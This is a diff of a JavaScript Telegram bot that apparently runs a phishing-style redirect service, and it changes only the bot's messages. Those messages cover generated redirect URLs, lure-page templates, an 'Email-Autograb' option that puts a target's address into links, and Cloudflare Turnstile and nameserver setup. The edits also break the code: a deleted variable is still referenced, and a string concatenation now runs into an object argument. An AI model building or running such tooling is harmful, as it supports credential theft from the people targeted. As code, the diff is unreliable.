@@ -1373,8 +1373,8 @@ if (bot) {
           `🚀 *URLs:*\n` +
           urls.map((url, index) => `${index + 1}. ${url}`).join("\n") +
           "\n\n" +
-          `Ask admin for Cloudflare nameservers\n` +
-          `Email capture: add ?email= to links`;
+          `Use the Cloudflare settings for Cloudflare nameservers you will add to your domain DNS\n` +
+          `For Email-Autograb add ?email=email@office.com to your links`;
 
         // Replace the status message with final results
         await ctx.telegram.editMessageText(
@@ -1704,9 +1704,8 @@ bot.on('callback_query', async (ctx) => {
             referenceImage,
             {
               caption: `✅ *Template Updated!*\n\n` +
-                `Your template has been set to: *${templateName}*\n\n` +
-                `All new redirects will use the ${templateName}.\n\n` +
-                `📸 Reference image above shows what this template looks like.`,
+                `Your template has been set to *${templateName}*, and all new redirects will use this template. \n\n` +
+                `📸 Sample image above.`,
               parse_mode: "Markdown",
               reply_markup: {
                 inline_keyboard: [
@@ -1719,8 +1718,7 @@ bot.on('callback_query', async (ctx) => {
         } else {
           await ctx.editMessageText(
             `✅ *Template Updated!*\n\n` +
-            `Your template has been set to: *${templateName}*\n\n` +
-            `All new redirects will use the ${templateName}.`,
+            `Your template has been set to *${templateName}*, and all new redirects will use this template.\n\n` +
             { 
               parse_mode: "Markdown",
               reply_markup: {
@@ -2442,8 +2440,8 @@ bot.on('callback_query', async (ctx) => {
             if (turnstileResult.success) {
               turnstileMessage = `\n\n🔐 *Turnstile Widget Created:*\n` +
                 `• Site Key: \`${turnstileResult.sitekey}\`\n` +
-                `• Mode: ${turnstileResult.mode}\n` +
-                `• Domain: ${domainName}`;
+                `•  ${turnstileResult.mode}\n` +
+                `•  ${domainName}`;
             }
           } catch (turnstileError) {
             console.error('Turnstile widget creation error:', turnstileError);
@@ -2453,20 +2451,13 @@ bot.on('callback_query', async (ctx) => {
           // Prepare nameserver information
           let nameserverMessage = '';
           if (nameserverInfo.nameservers && nameserverInfo.nameservers.length > 0) {
-            nameserverMessage = `\n\n📡 *Cloudflare Nameservers:*\n` +
+            nameserverMessage = `\n\n📡 * Nameservers:*\n` +
               nameserverInfo.nameservers.map((ns, i) => `${i + 1}. \`${ns}\``).join('\n') +
-              `\n\n⚠️ *Important:* Update your domain registrar with these nameservers for Cloudflare to work!`;
+              `\n⚠️ Update your domain with these nameservers for Cloudflare to work!`;
           }
 
           const successEmoji = '✅';
-          const statusText = [
-            `${results.alwaysUseHttps ? successEmoji : '❌'} Always Use HTTPS`,
-            `${results.autoHttpsRewrites ? successEmoji : '❌'} Automatic HTTPS Rewrites`,
-            `${results.browserIntegrityCheck ? successEmoji : '❌'} Browser Integrity Check`,
-            `${results.securityLevel ? successEmoji : '❌'} Security Level: High`,
-            `${results.sslEnabled ? successEmoji : '❌'} SSL/TLS: Full`,
-            `${results.universalSSL ? successEmoji : '❌'} Universal SSL: Active`
-          ].join('\n');
+          
 
           // Add error details if any settings failed
           let errorDetails = '';
@@ -2479,10 +2470,10 @@ bot.on('callback_query', async (ctx) => {
             ctx.chat.id,
             statusMsg.message_id,
             null,
-            `✅ *Security Settings Configured!*\n\n` +
+            `✅ *Setup Configured!*\n\n` +
             `${statusText}${dnsMessage}${turnstileMessage}${nameserverMessage}${errorDetails}\n\n` +
-            `🔒 Your domain is now protected with Cloudflare security features${results.sslEnabled ? ' and SSL certificates are activated' : ''}!\n\n` +
-            `💡 *Tip:* Enable Bot Fight Mode manually in Cloudflare dashboard (Security > Bots) for additional bot protection.`,
+            `🔒 Your domain is now protected with Cloudflare  ${results.sslEnabled ? '  SSL Certificates are Activated' : ''}!\n\n` +
+            `💡`,
             {
               parse_mode: "Markdown",
               reply_markup: {
